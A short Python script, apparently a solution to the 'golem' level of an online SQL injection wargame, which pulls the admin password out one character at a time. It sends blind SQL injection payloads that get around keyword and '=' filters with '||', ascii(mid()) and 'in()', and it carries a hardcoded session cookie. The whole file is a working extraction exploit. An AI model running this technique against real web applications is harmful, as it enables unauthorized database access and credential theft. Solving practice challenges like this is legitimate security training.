import requests
import string

url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies={'PHPSESSID':"ci41fo6lumj51dfsglosja6mb2"}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"

print("Find pw is ")
for i in range(1, 9):
    for find in ascii_code:
        params=f"?pw=1%27%7c%7cascii(mid(pw,{i},1))in({ord(find)})%23"
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)

        if response.text.find("<h2>Hello admin</h2>")>0:
            print(find, end='')
            break

print("\nDONE!")